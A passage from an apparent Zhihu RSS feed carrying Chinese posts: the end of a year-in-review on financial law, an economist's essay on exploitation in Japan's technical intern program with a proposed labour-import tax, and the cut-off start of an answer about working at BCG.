<b>证券市场“雪球”越滚越大。</b>雪球作为衍生产品，开始在我们的证券市场流行。今年看起来，参与雪球产品交易的投资者应当比许多买基金的用户收益要高，因为波动有限，敲入与敲出都极少，参与者可以获取较高的固定收益。不过这种产品一旦流行起来，将来市场剧烈波动时，就可能产生失控现象。因此，后来监管部门加强了监管，统计规模。去专门找了一份雪球协议文本看了下，它是在衍生品协议比如ISDA或者NAFMII基础上修改形成主协议、补充协议以及具体的交易确认书，这种做法至少比以前类似的协议要完善许多。以前有一些协议（现在在一些银行理财产品中可能还使用），连双方是代客理财关系还是交易对手方都没有写清楚，导致一发生纠纷扯皮不断。券商是跟你赌，而不是为你的利益提供理财服务。</p>\n<p data-pid=\"ADLO-6tT\">4. <b>GAMESTOP与SPAC值得观察研究。</b>就国外市场而言，比较有戏剧性的是美股的GameStop事件，做空的华尔街大鳄与闲来无事却有情怀的散户进行了一次大PK。暴涨暴跌，到底是散户收割华尔街？还是机构收割机构？Main Street VS Wall Street,无论如何都是电影的好题材，据说已经开拍了。更有意思的是，交锋过程中，线上股票交易平台Robinhood，竟然暂停了散户的交易。起了个罗宾汉的名，行的是不是侠义之事，只能到国会面前说一通了。由于中国没有做空机制，所以这种情况不会在中国发生，只能隔岸吃瓜，但里面的证券法问题值得思考。另一个值得注意是SPAC（特殊目的收购公司）的流行，虽然中国还没有SPAC制度,但这不妨碍SPAC成为我们关注的一项制度。相关的规则引发了金融法律界的研究。IPO是公司找钱，而SPAC则是钱找公司。这种规则的创新，能否引入并推行？近日，香港开始也发布自己的SPAC上市新规，进一步引起热议。</p>\n<p data-pid=\"LPwQTIiu\">5. <b>衍生品净额结算的问题有望得到解决。</b>金融市场许多外资银行关心的期货衍生品合约中的净额结算问题，在很长时间内是他们从事此类交易的担心与障碍，因为破产法中管理人有可能挑拣履行。今年，期货与衍生品办法草案专门规定了一条：按照本法规定的协议方式从事衍生品交易的,发生约定的情形时,可以依照协议约定终止交易,并按净额对协议项下的全部交易盈亏进行结算。依照前款规定进行的净额结算,不因交易任何一方依法进入破产程序而中止、无效或者撤销。与此同时，中国银保监会的相关文件《关于衍生工具交易对手违约风险资产计量规则有关问题的通知》也进一步做出了相关的规定。各方都希望给市场参与者一个相对稳定的预期。外资银行摩拳擦掌，也许不久的将来，这一块业务就会蓬勃发展。想赌就赌吧，买定离手，愿赌服输。</p>\n<p data-pid=\"33zpS9UU\">6. <b>法律随着政策变化而开始有所转向。</b>目前宏观杠杆率已经达了270%，当债务越来越多时，顶层设计对待金融机构在态度与政策口径发生变化，比如2020年的提法是推动金融系统全年向各类企业合理让利，到了2021年11月，又变成要坚决遏制金融服务业领域的垄断。牛夫人还是小甜甜，你说了算。为了减轻债务，法律一点点地改变，比如一般保证与连带保证推定模式变化、破产时担保人停止计息、个人破产制度的深圳试点，还有一些案件中，当事人约定的咨询费、服务费的各种费用都被否定了。但值得思考的是，债务的问题，是通过合同法、担保法的改变来减轻责任，还是通过破产法来直接免债更合适呢？即便通过不公平合同条款的认定来减轻债务人负担，对于金融机构与自然人的合同条款约定、金融机构与企业之间合同条款约定，是否一视同仁？其实缔约能力是有所不同的。信用卡服务中的各种收费，与银团贷款中的各种收费，应有所区别。</p>\n<p data-pid=\"x570fdgX\">7. <b>个人破产法从设想已经变成现实</b>。深圳的首例案件，展示了个人破产制度的试水过程。许多自然人债务人，应当通过破产制度卸去身上的枷锁，否则越来越多的人成为债务的奴隶，最后的结果就是“无产阶级失去的只有锁链”。在全民债务增加的情况下，法律会慢慢变化的。如果去看美国破产法的历次变化，其实就是债权人债务人斗争和博弈的历史记载。</p>\n<p data-pid=\"-rC8i9JA\">8. <b>担保法规定的提供担保的规则越来越严。</b>担保效力要看内部决议，尤其是上市公司提供的担保，毕竟是所有股民的上市公司，而不是你大股东一个人的上市公司。因此，上市公司对外担保还要求公告。至于是不是子公司、孙公司、合并报表的公司都要公告、公告具体形式如何、能否概括公告，实务仍在发展。但需要注意的是，法律应有一个新老划断的过程。如果法律没有过渡期，那么市场的交易者所面临的不确定性会越来越大。因为根据以往法律规则，担保大多是认公章而忽视决议，现在突然说要看内部决议，前几年提供的担保就容易被认定为无效。说实在的，这几年监管规则、法律规则的变化剧烈，导致交易的稳定性、增信措施的有效性受到越来越多的挑战，身在这个市场中的人，只能不断适应剧变。百年未有之大变局，只能说适者生存。</p>\n<p data-pid=\"IF7zfvuM\">9. <b>利率稳中有变，开始下行。</b>因为疫情的原因，国外在放水，而国内经过2020年的宽松之后，2021年实际上是慢慢收紧货币，并未大规模放水。但经济形势的变化、房地产的躺平，年底的经济工作会议重新定调，导致LPR在20个月之后终于有所降低。2022年的货币政策大概率仍将放水，有利于资本市场。想起一个段子，2022等于2020 too…疫情仍在发展，在这种情况下利率中枢的下行应该是大概率的事件。</p>\n<p data-pid=\"lfK75vmV\">10. <b>房地产税又成为热议话题。</b>在当前的预期下，税收肯定是越来越严，罚款案例也有所增加。但这些与房地产税相比，后者关心的人更多。当中国的房地产税又一次提上议事日程之后，如何收、免征额等等，都成为老百姓关心的细节。在目前的形势下，对房地产的预期是否已经开始改变？如果盲目买房的人有所减少，再收房地产税，则会如何变化，只能有待慢慢观察。房地产是一项重要的担保品，金融借款中，房地产担保是大头。因此，如果征收房地产税，自然会影响金融市场。</p>\n<p data-pid=\"75HafSR3\">11. <b>房地产公司美元债问题引发关注。</b>因为三条红线的规定，在短期内房地产公司竟然以意想不到的方式躺平了。他们原先发行的许多美元债很快成为世界关注的焦点，可谓是暗流涌动。美元债，有一些是没有在岸担保的，有一些是有在岸担保的，更多的是没有担保但是有在岸的类担保合同作为增信手段的。这些在法律上如何区分对待，都是值得思考的问题。问题的复杂性，可以参见笔者这个帖子：<a href=\"https://zhuanlan.zhihu.com/p/430466818\" class=\"internal\"><span class=\"invisible\">https://</span><span class=\"visible\">zhuanlan.zhihu.com/p/43</span><span class=\"invisible\">0466818</span><span class=\"ellipsis\"></span></a>。无论如何，房地产企业海外融资的利率不会再像以前那样了。</p>\n<p data-pid=\"7BcU1zcs\">12. <b>投资要非常当心。</b>今年看到一个案件，高达数十亿的出海投资，券商操盘，后续多家基金层层跟投，结果全军覆没，纠纷连续不断。如果你看过那些投资尽调与决策材料，只会觉得呵呵。都说受托投资，法律上要负有忠实勤勉义务，但我们这个市场，可以把别人法律中忠诚勤勉的条文完全抄过来，但做过实务就会发现，缺乏程序法以及证据法的支撑，你在绞尽脑汁分析勤勉义务的时候，其实管理人很可能在忠诚义务上早出问题了，比如收受贿赂，乱投一通，或者自融。但只有强力部门介入，才可能有证据。受托管理这种不完备契约，要想对方尽职尽责，在目前的法律框架下，非常难。这种情况就如同老板要你尽心尽责，但你总是想着躺平摸鱼，却装出一副很忙的样子，老板也不见得能察觉。因此，投资者往往要订立保底之类的债务类别的约定，相当于降低自己的举证责任。虽然在打破刚兑的背景下不被提倡，但在某种意义上，存在的就是合理的。没有保底条款，大概率是肉包子打狗。更惨的是，一堆中型基金，看着人家银行进场，以为机不可失，实际上人家已经备有护甲（单独另签保底条款）而你蒙在鼓里，亏光之后才明白，与你们签约的，只是一个注册资本几百万的项目公司…债券结构化发行那些花招，其他领域已经学过来了。你不理财，财不离你。要说投资建议，还是老老实实投公募基金吧…因为分散投资、散户多、可以跑得快。</p>\n<p data-pid=\"86mwIKfe\">最后，祝读者们圣诞快乐！新年快乐!</p>\n<p data-pid=\"EiC5qCEZ\"><b>KEEP  CALM AND CARRY ON</b></p>\n<p data-pid=\"zY4uelqy\"><b>KEEP  WELL  AND PROSPER</b></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/fuwangezy?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">FU Wang</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/448724522?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"出国劳务在日本打工到底有多累？","date":"2022-02-15 04:25:10","description":"\n<p data-pid=\"gujscGZn\">我是一个经济学学者，因为研究涉及现代奴隶制，所以最近读了一点有关日本技能实习生（研修生）的材料，写了下面这篇随笔。我不是什么专家，对去日本打工也没有任何身边的故事可以分享，但写完这篇随笔后，我觉得这里的信息，尤其是我介绍的这篇 Verite的调查报告，可能对未来考虑去日本以技能实习生身份打工的中国人会有帮助，所以特地把这篇随笔挂到这个问题下面来。</p>\n<h2>问题背景</h2>\n<p data-pid=\"Wxl4lRD1\">今天的“一天一问”为什么会问这个问题，我先做一下解释。我准备写一本书《那个买卖活人的世界》，讲人身依附的经济学原理。这本书所关注的历史大多是百千年前的往事。但我想在书的最后一章，讲讲现代奴隶制，谈谈奴隶制在未来几十年复辟的危险。</p>\n<p data-pid=\"xZR0wZ3w\">奴隶制作为一种制度，它的核心特征是：雇主和中介直接或间接地依靠政府强权保障，侵犯劳动者退出劳动关系的权利。劳动者难以辞职、跳槽，于是任由雇主和中介欺凌。在现代自由雇佣制度下，政府不仅保障劳动者的退出权，还禁止劳动者主动和雇主签订限制自己退出权的合同。</p>\n<p data-pid=\"lM3g6kvY\">自由雇佣制不是好好的吗？有什么人会想复辟奴隶制呢？</p>\n<p data-pid=\"M0ed5qF7\">根源在国家间的贫富差距和人口失衡。未来几十年的世界，面临下面三个约束：</p>\n<p data-pid=\"4j7sgbSb\">1）工业化国家出生率低迷，迫切需要来自低收入国家的劳务输入。</p>\n<p data-pid=\"1vxlSylK\">2）国与国人均收入差距依然悬殊。</p>\n<p data-pid=\"xENh8yKH\">3）因文化和政治原因，绝大多数国家都不欢迎低技术外国劳工定居、归化。</p>\n<p data-pid=\"Mzf7E1eP\">第一点意味着，富国不能把国门彻底关上。关上的话，它自己的经济受不了。第二点意味着，只要富国打开国门，贫穷国家就有很多人想要去打工。第三点意味着，富国会对来打工的人施加不平等条件。不施加不平等条件不行吗？不施加的话，要来打工的人那么多，难道都放进来吗？本国人会同意吗？设置人数限制？怎么限制呢？排队？摇号？排队和摇号就意味着有巨额利益白白被浪费掉了，何况全球范围的摇号压根就没法操作，大家都来报名，真正适合来打工的没几个。</p>\n<p data-pid=\"vHV-gIX9\">面对这个问题，一些富国早就开始实践自己的方案。但方案的本质往往是奴隶制。这就是为什么我今天要去阅读日本技能实习生项目(Technical Intern Training Program，以下简称 TITP)的资料。技能实习生，日本政府官方说法，这个项目是日本为了帮助发展中国家，请这些国家的劳工来日本学技术，今后回去建设自己的国家。但国际公认的看法是，参加这个项目的实习生学不到什么“先进技术”，日本操作这个项目的主要目的就是为了弥补国内的低技术劳动力短缺。</p>\n<p data-pid=\"uSzViiu0\">更受人诟病的是，日本技能实习生项目是一个很典型的奴隶制度。这个项目下的外国劳工，他们的签证是和雇主的劳动合同挂钩的，雇主一旦解雇劳工，劳工就面临遣返。而这些劳工当初参加这个项目，需要给中介机构缴纳大额招工费、“培训费”和押金，一旦遣返，之前的费用都浪费了不说，那些押金就再也拿不回来了。所以雇主可以把劳工捏得死死的。</p>\n<p data-pid=\"QkjO5eb7\">帮这个项目招工的中介机构当然都说这个项目的好处（网上很多相关的信息都是中介机构写的），比如他们会说日本政府怎么用法律保障工人的权益，怎么监管雇主的用工行为等等。可稍有常识的人都知道，政府监管固然重要，但能真正保护劳动者的，首先是高度竞争的劳动力市场。失去退出权、不能享受市场竞价的劳动者永远是待宰的羔羊。</p>\n<p data-pid=\"zjYTBZjX\">我研究这个事情，最终还是为了服务于中国。中国在未来几十年，有可能会遇上同样的问题，需要吸纳国外的劳务输入。要输入多少人、文化上怎么融合，我没什么想说的。可一旦国家做出了决定，要大规模接受劳务输入了，那我希望中国不要走上日本、美国、沙特等国家现代奴隶制的老路。有没有办法避免奴隶制？——有的！我会在这篇随笔的最后谈解决办法。我先介绍一下我读到的日本技能实习生项目的情况。</p>\n<h2>Verité的调查报告</h2>\n<p data-pid=\"0buYNSCV\">我今天读的资料里面，最有价值的是一家致力于全球劳动者权益保护的非盈利组织Verité（法语，“真相”）写的报告。我把这份报告的内容总结一下。</p>\n<p data-pid=\"7fFl-XM_\">首先说一下这份报告的信息来源。来源有两个。第一个是Verité 研究者对日本岐阜当地技能实习项目下的中国劳工做了一个网上的问卷调查，调查了 132 个中国劳工。</p>\n<p data-pid=\"k2FWzKYu\">第二个是Verité查阅了岐阜总工会在 2010 年到 2017 年间收到的来自中国劳工的劳务纠纷案卷，共 769 份，从案卷中汇总比较典型的问题，再找最能反映这些问题的具有代表性的 27 位劳工，做深入的访谈。</p>\n<p data-pid=\"HBqXLADu\">显然，这份报告的价值不在于提供一个有代表性的平均值，而是帮助我们理解劳动纠纷的性质，窥见“实习生”的工作生活状态。这 27 位劳工的访谈信息，样本偏误可能很大。那 132 人的调查问卷会好一些。我在引述报告内容时，会说明这些结论到底是来自访谈，还是问卷。</p>\n<p data-pid=\"GlmxdTlm\">首先，大家都关心的，这些去日本打工的所谓实习生能挣多少钱？</p>\n<p data-pid=\"SUQb7_XK\">项目一般是三年长。中介事先宣传的三年总收入平均是 30 万人民币（以下金额若非特别说明都是人民币）。访谈加问卷得到的三年实际总收入平均是 22 万人民币。其中包括劳工们的加班收入。</p>\n<p data-pid=\"7uHDaTU3\">为了挣这 22 万人民币，劳工在国内需要先给招工的中介支付平均 53000 元的招工费，相当于在日本8 个月的平均月薪。回答问卷的大多数劳工都是举债应招，个别人还向银行抵押了房产来付招工费。27 个受访者中有 26 人都向中介支付了5000 元 - 10000 元的押金。如果他们打工期间中途离职或被解雇，押金会被没收。为了让劳工乖乖听命，还有中介要求劳工写一张无中生有的欠条，承诺除非干满三年，否则就要偿还欠条上的钱，劳工还不上就要欠条上的担保人还。有一个受访者写了一张 21万元的欠条给中介。</p>\n<p data-pid=\"zKq0C0cA\">要去日本打工，这些中国人还得先上一个月的日文课（往往是中介开授），学费 3000-5000 元，住宿费 2000-3000 元。在日本工作一年，要参加一个几乎必过的考试，考试费培训费又是两三千。问卷样本中，在日本的房租水电费平均 1870 元一个月，三年就是近七万元。</p>\n<p data-pid=\"urGHITvp\">此外，劳工的合同上往往有苛刻的赔偿条款。比如，一位受访者的合同里说，如果她连续三天离开工作单位，赔偿金高达 50000 人民币。另一位受访者合同上说她必须在雇主面前“态度谦卑，举止温柔”，否则要罚款 10000-40000 元人民币。但所有受访者都说在到日本以前，中介隐瞒了可能要罚款的事。</p>\n<p data-pid=\"1mXSvV34\">更令人心寒的是，中介和雇主还违法为劳工“强制储蓄”，很大比例的工资收入自动进入雇主控制的银行账号，劳工只能查里面的数字，要用里面的钱需要向雇主打申请报告。有个江苏女工，每个月发工资时，雇主会扣下她 70%的工资，“帮她保管”；每三个月，这个女工的中介公司会来厂里从雇主那里取走这个季度的保管工资，转由中介公司保管。而且中介告诉女工，如果她辞职，那么所有代她保管的钱会全部没收。</p>\n<p data-pid=\"CIbgVT23\">把这些账目加加减减，显然，这些劳工是无法实现中介宣传的“干三年，稍微省省就能给家里寄二三十万”的。</p>\n<p data-pid=\"P_MvOHx5\">接下来，说说劳工的工作环境。有40%的问卷回答者说，他们的雇主禁止他们使用手机和电脑，连他们工余时间呆在宿舍也不可以。21%的人说雇主拿去了他们的护照（这是违法的，因为拿去护照、身份证侵犯了劳工的退出权，是任何一个维护自由雇佣的政府首先要惩罚的奴役行为）。</p>\n<p data-pid=\"AbFMUhmT\">工作条件上，劳工经常被安排到危险和有害健康的岗位上，并且得不到有效的防护设备。我在另一篇NPR的报告中读到一个越南“实习生”在付给中介 9500 美元的招工费后，到福岛清理核垃圾，除了手套、面具和辐射探测仪，他没有任何防辐射设备。</p>\n<p data-pid=\"hrP68Y-L\">Verité这份报告则举了下面一些例子：有个中国女工在鱼肉加工厂工作，需要长时间把下半身浸在冷水里，雇主只给她一条不防水的破烂围裙。</p>\n<p data-pid=\"mIcMQW8D\">有个男工在垃圾处理厂操作弧焊机切割金属，要吸入烟尘，他在反映这一点后，雇主只给了他一只用过的旧口罩。他从来没有被培训过如何使用弧焊机。工作中还发生过爆炸，侥幸生还。</p>\n<p data-pid=\"Kl77wHfP\">一个建筑工人没有接受任何安全方面的培训，就负责搭脚手架，导致手腿伤残。刚受伤不能工作的那些天里，他靠朋友的接济度日。之后的半年里，他本来应该多次去医院检查治疗，但雇主不让他去，他绑着石膏也让他继续工作。他要求额外伤假时，雇主威胁不再更新他的工作签证，要遣送他回中国。</p>\n<p data-pid=\"ZMfGfsMB\">从27 个受访者来看。他们一般每个月要工作 300 个小时，忙起来要 350 个小时。有个受访者说，即使工厂没有工作，雇主也要她加班，甚至给雇主自己家打扫卫生。但是，雇主经常少给、克扣或者不给加班费。有三个女工在服装厂工作三年后，向雇主讨要拖欠的加班费。雇主二话没说，把她们赶上一辆车，不说目的地，直接拉到机场。而她们行李都还留在宿舍，连住的地方都没有。有个雇主克扣三个劳工的工资，三年累积达到每个人 90000 多元。三个劳工连基本生活都难以维持，靠着家乡寄来的食品过活。后来这个厂倒闭，雇主跑路了。</p>\n<p data-pid=\"V3wmY7fB\">按照日本的法律，这些劳工和日本劳动者一样享受最低工资的保护。然而，大多数劳工都没有拿到最低工资，有些人的时薪甚至不足最低工资的一半。可是，雇主为了应付政府的检查，会要求劳工在伪造的工资单上签名。</p>\n<p data-pid=\"NH9-ewWK\">我不怀疑，日本有严格细密的劳动保护法律，而且这些法律也覆盖了技能实习生。但是，正如我之前说的，真正保护劳工的，是充分竞争的劳动力市场，是其它招工的企业。一旦切断劳工跳槽的选择，劳工只能任由雇主宰割。光靠政府派人检查，政府付给检察员的工资还不如直接给劳工更加实在。而且，技能实习生语言不通，劳动纠纷发生后又面临遣返，人身还受制于雇主、中介，很难通过司法途径维护自己的权益。问卷样本中，61% 的劳工在签好合同后没有收到该自己保存的那份合同，甚至还有签空白合同的情况。这种情况下，怎么和雇主对簿公堂呢？</p>\n<p data-pid=\"Lw2gpUcZ\">当然，有人会说，这个报告的样本是不是有偏差？会不会只是岐阜的中国劳工受到剥削特别严重，其它地方还好？当然，这个报告没有覆盖更大的范围，它的样本在代表性上尚无有说服力的支持。但我想，撇开具体的案例、数字，问题的性质、产生问题的逻辑都是相通的。归根结底，正是因为雇主不用担心劳工的辞职、跳槽，所以能肆意凌虐劳工。这一点对所有技能实习生都成立。难道能指望其它地方个别雇主发善心，或当地政府花几倍于劳工收入的钱来监管企业的用工行为吗？</p>\n<p data-pid=\"S7uXNl_F\">再想想，雇主和中介为什么要处心积虑要防止实习生离职、跳槽？又是押金、又是欠条、又是没收护照、又是禁止通讯（甚至还有威胁国内家人的）。事出反常必有妖。一定是工作条件不好，才用这么多手段嘛。其实雇主和中介担心的，不是劳工回国，而是劳工在日本打地下黑工。黑工市场的雇主也很有限，还要冒着违法的风险。打黑工能挣多少钱？为什么会比技能实习生还吃香？技能实习生的普遍处境应该可以想象了吧。</p>\n<p data-pid=\"wd_G6w6m\">2018 年12月，日本国会通过了移民政策的改革方案。在技能实习生项目外，又引入了两个新的项目：一类专门技术工人签证（Specified Skilled Worker 1, SSW1）和二类专门技术工人签证（SSW2）。现存的技能实习生在经过考试后可以逐渐转为SSW1，获得额外的打工年限。这个 SSW1 与技能实习生最大的区别是，它是允许换雇主的。</p>\n<p data-pid=\"SGeUAYK0\">但这一点到底有没有落到实处，似乎还是未知数。能用 SSW1 签证招工的日本企业必须符合一定的资质，所以外国劳工面临的市场竞价是有限的。何况， SSW 1 签证的具体操作、劳工跳槽权利的保障，都需要日本政府行动上的努力。光在嘴巴上说可以跳槽，真的有用吗？最简单的，你要跳槽，行。得靠前任雇主办手续吧？如果他威胁说在办手续时给你拖一阵子，把你逼回国，你还能跳槽吗？甚至，只要前任雇主提一句给下任雇主的推荐信，跳槽权就有名无实了。</p>\n<p data-pid=\"5y4dWCnK\">日本的这轮移民政策改革，不见得有多么真诚想要解决奴隶制问题，更像是为筹备奥运，来弥合进一步扩大的劳动力缺口。而且，即使日本完美地执行了新的政策，大不了也就是十年之后，接近美国的政策，美国的政策，难道就不是奴隶制了吗（这个我们以后再说）？</p>\n<h2>解决方案：公开透明的劳务输入税</h2>\n<p data-pid=\"cqJfWuJU\">我最后谈谈，怎么来解决吸收外国劳务输入时怎么杜绝奴隶制的问题。</p>\n<p data-pid=\"F3kOZuFo\">你如果把国门彻底关上，完全不要外国人来打工，那当然不会有这个问题；或者把国门完全敞开，对外国人完全一视同仁，也不会有这个问题。但前者，经济受不了；后者，政治上受不了，完全没有可行性。在现实约束下，有没有办法来解决奴隶制呢？</p>\n<p data-pid=\"Pd4s5XcP\">我的建议是，让外国劳工把招工费交给政府（固定的劳务输入税），而不是交给中介和雇主；政府收了这笔劳务输入税后，就让外国劳工在本国劳动力市场上和本国劳动者自由竞争，不受任何劳工政策的额外约束，甚至他不工作，也别由他自己选择。</p>\n<p data-pid=\"9b3Wi8W5\">国家的贫富差距面前，很多外国人都争着来打工，他们愿意付出一笔很大的代价，跑到富国去工作。现在这笔好处是给蛇头、中介捞去的。劳工给中介交钱后，甚至雇主还要给中介一笔钱“买人”。为什么不把这笔钱收到政府的手中，造福全民呢？而且，现在这帮中介在捞了好处后，雇主为了把自己付出的买奴隶的钱收回本，还得违法剥削劳工。“奴隶市场”充分竞争的结果是，能够存活壮大的企业，是更善于使用奴隶的企业。也就是那些对劳工更加狠心苛刻的企业和更善于钻制度空子的企业。这不仅造成人道主义灾难，还在本国企业间造成不公平。</p>\n<p data-pid=\"Y3Kg-Lhk\">如果用劳务输入税来控制劳务输入的规模，问题则迎刃而解。在本国决定开放招工的友好国家，劳工可以敞开申请。申请的人如果比想要招募的多，那就随行就市，提高劳务输入税。比如以当代中国这样的情况，计划开一年 50 万人的口子的话，劳务输入税也许能提到15万人民币一年。一个外国人要来打工，与其把决定权交给帮他申请的企业、交给政府管理部门，去审核劳工是不是属于高技术、是不是紧缺人才，学历是不是高，并在繁文缛节中滋生腐败，还不如直接问：你是否愿意付一年 15 万元给要去打工的国家的政府。愿意的，只要满足基本的国籍和年龄条件，就来。至于来了之后做什么工作，是上流水线，还是教书、旅游、画画、做慈善，政府为什么要额外派人去监督呢？你要是担心他犯罪。犯不犯罪，是公安部门的事情。难道移民审核的繁文缛节就能对付犯罪了？甚至你越搞奴隶制，越容易滋生腐败和黑市。</p>\n<p data-pid=\"408-pnrD\">政治上，国内老百姓也更容易接受这样的劳务输入。首先，能付 15 万来打工的，一般学历都够高、素质都不错，不会是那种苟苟缩缩的形象。其次，他们在自由竞争的劳动力市场上收入够高，反而不会让本国劳动者抱怨“以低工资抢饭碗”。再次，劳务输入税统一、公开、鲜明，本国居民都知道，这些外国人是给国家财政贡献了 15 万元才来打工的，自己是分享了利益的，没什么好抱怨。不像日本现在这情况，技能实习生面向低技术劳动者、因为在奴役之中只能生活在社会的暗角、以超低的收入服务社会还被本地居民嫉恨抢饭碗。</p>\n<p data-pid=\"udAKBNC2\">日本搞技能实习生，本来是为了填补劳动力缺口，为什么搞了几十年，缺口还那么大，这个项目的规模却那么小（现在只有三十万人）？我揣测，一大原因，就是日本这个奴隶制的搞法，搞得国内不得人心，政治上阻力重重，老百姓不让这个项目扩张。结果整个经济都受到了拖累。做坏事，还把自己给坑了。</p>\n<p data-pid=\"PKHD1Moo\">把外国劳工吸引来，最终是希望他们在这个国家也能取得人生的成功、辉煌。不仅打工，甚至有朝一日，自己创办企业，贡献新点子、新产品。这在日本技能实习生制度下有可能吗？而在公开透明的劳务输入税制度下，这完全没有问题。</p>\n<p data-pid=\"DOfF162e\">但要转为劳动输入税，肯定会受到既得利益集团的阻力。毕竟你把好处从个别“奴隶雇主”手中转到了全体老百姓的手中。他们会游说，说搞劳务输入税，就不能精确甄别“紧缺人才”了；说搞劳务输入税，国家吃相难看什么的。对这种祸国之论，要看穿它背后的算计。</p>\n<h2>声明</h2>\n<p data-pid=\"0mYIvwXH\">需要注意，我的意思并不是说我们应该引入海外劳工。我只是说，一旦我们国家决定引入劳工，我们得吸取日本的教训，想法子避免陷入奴隶制的泥潭。当然，我这半天的阅读对我理解这个问题来说，只是聊胜于无。我的认识很可能随着进一步的了解而改变。我也期待读者的指正、建议。</p>\n<p data-pid=\"I-xiz_58\">我在知乎上搜索“日本技能实习生”，发现信息聊聊。仅有的几条，大多也是中介写的。虽然随着中国人收入水平的提高，技能实习生项目对中国人的吸引力越来越低。但目前中国在日本的“实习生”至少还有十万上下，也不排除有些年轻人想借这个项目去“见世面”，被中介骗上飞机。他们在做决定时，很可能会到知乎上搜索一下。所以，我会把这篇随笔，也发到知乎上，希望给这些怀揣梦想的同胞一点参考。</p>\n<p data-pid=\"-wvvwCOt\">我在进一步研究阅读后，一旦确认我的观点无误，我还会和“乐道胡同”的同事们做一期有关移民政策与现代奴隶制的视频节目，希望能尽我们绵薄的力量，为中国未来有需要的时候贡献一份有益的声音。</p>\n<p data-pid=\"ME47mIIq\"><i>2021 年 3 月 1 日自修，3 月 2 日完稿。</i></p>\n<hr>\n<h2><b>主要参考文献</b></h2>\n<p data-pid=\"yD8PYUFf\">Kobayashi, Chie &amp; Anthony Kuhn. 2019. “As Japan Tries Out Immigration, Migrant Workers Complain of Exploitation.”Available online at <a href=\"http://link.zhihu.com/?target=http%3A//npr.org\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">npr.org</span><span class=\"invisible\"></span></a></p>\n<p data-pid=\"wcuCIo_8\">Milly, Deborah J. 2020. “Japan’s Labor Migration Reforms: Breaking with the Past?”Available online at <a href=\"http://link.zhihu.com/?target=http%3A//migrationpolicy.org\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">migrationpolicy.org</span><span class=\"invisible\"></span></a></p>\n<p data-pid=\"fouI0IEl\">Verité. 2018. “Forced Labor Risk in Japan’s Technical Intern Training Program: Exploration of Indicators among Chinese Trainees Seeking Remedy.”Available online at <a href=\"http://link.zhihu.com/?target=http%3A//verite.org\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">verite.org</span><span class=\"invisible\"></span></a> website.</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wulemin?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">吴乐旻</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/32162636/answer/1768073868?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">58 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/353177402?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎样出国劳务?</a><br><a href=\"http://www.zhihu.com/question/347967906?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">出国劳务有办过的么，可以告诉我一下么？</a><br>\n","link":"http://www.zhihu.com/question/32162636/answer/1768073868?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"波士顿咨询(BCG）的企业文化是怎样的，推荐应届生加入吗？","date":"2022-02-15 04:20:31","description":"\n<p data-pid=\"IsoLu9Dn\">属于读了Ph.D.，技术还算扎实那种，之前做了一阵子科技创业公司，行业震荡期当了逃兵，加入了BCG。在consulting干了一年半后，因为consulting的共性问题离开。目前在一家创业气质的基金当二级狗。想来题主问的是个经典问题，why consulting, why BCG。</p>\n<p data-pid=\"pUDT99Xw\"><b>简而言之，如果没有仕途或科研/技术的志向，consulting是应届毕业生接近最优的选择之一，BCG又大概是其中排名第一/top tier的选项。但在工作过程中，记得多问自己，现在的状态extrapolate五到十年，是不是你想要的。</b></p>\n<p data-pid=\"QdRgYngo\">题主既然问了这个问题，想来是不考虑仕途和科研这两条需要点情怀的路了。在此基础上，其实要自己回答这个问题很简单，你十年后想要的人生状态是怎样的？有没有达到这个状态更直接的路径？</p>\n<p data-pid=\"zl6b5US2\">如果没有，或者暂时没有答案，那么consulting，尤其是对于家境普通、本科\\硕士毕业的同学，会是一个接近最优的选择。那么BCG会是consulting中我心目中第一的选择。但更重重要的是，在这期间一定要利用好这个平台，找到你的目标和路径，否则容易陷入“常青藤的绵羊”的状态，在更长的时间尺度上得到一个非常次优的选择。毕竟，这个时代在奖励敢于take risk的人。</p>\n<p data-pid=\"vfYHgAWA\"><b>对没有明确方向的应届生，这会是一个接近最优的选择</b></p>\n<p data-pid=\"HYihP4Qr\"><u>首先，BCG，或者tier1/tier2 consulting能帮你很好地衔接“学生如你”和\"独当一面\"。</u>如果应届生陷入迷茫，大概率说明自己的专业领域和自己的专业技能水平至少一个出了问题，这也是我的情况。这种情况下，就不要骗自己，不必看知乎上各种劝退文说的长期问题来否决一个短期方案。</p>\n<p data-pid=\"WiJ1G3sJ\">在最开始的至少半年时间，也就是所谓的investment期间（你的工资不来自项目，而是来自公司层面对你的投资），所有人都会对你很宽容，给你时间迅速学习作为一个顾问的hard and soft skills。这个时间也是你explore不同领域，最终选择一个相对长时间愿意合作的老板/团队的时候。这个过程你会飞速成长，变得professional。</p>\n<p 